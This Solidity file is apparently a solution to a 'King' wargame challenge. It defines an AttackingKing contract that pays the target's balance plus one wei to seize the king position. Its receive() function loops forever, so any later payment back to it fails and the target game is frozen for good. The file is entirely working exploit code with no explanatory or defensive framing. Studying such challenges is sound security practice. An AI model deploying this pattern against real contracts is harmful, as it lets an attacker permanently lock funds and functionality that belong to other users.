// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./King.sol";
import "hardhat/console.sol";

contract AttackingKing {
    address public contractAddress;

    constructor(address _contractAddress) payable {
        contractAddress = _contractAddress;
    }

   receive() external payable {
        while(true) {}
    }

    function hackContract() external {
        uint bareMinimum = contractAddress.balance + 1;
        contractAddress.call{value: bareMinimum, gas: 10000000}("");
    }
}
